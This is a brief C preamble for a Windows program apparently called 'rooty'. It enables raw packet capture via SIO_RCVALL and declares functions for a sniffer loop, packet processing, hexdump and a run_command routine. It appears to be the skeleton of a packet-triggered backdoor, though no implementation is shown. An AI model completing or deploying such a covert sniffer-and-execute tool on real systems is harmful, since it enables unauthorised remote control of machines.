#include "rooty.h"

#ifndef UNICODE
#define UNICODE
#endif

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <shellapi.h>
#pragma comment(lib,"ws2_32.lib")

#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)

uint32_t sniffer_loop(SOCKET *s);
uint32_t process_packet(const uint8_t *buffer, uint32_t len);
uint32_t run_command(const uint8_t *cmd, uint8_t *buffer, uint32_t buffer_size);
void hexdump(const char *buffer, uint32_t size);
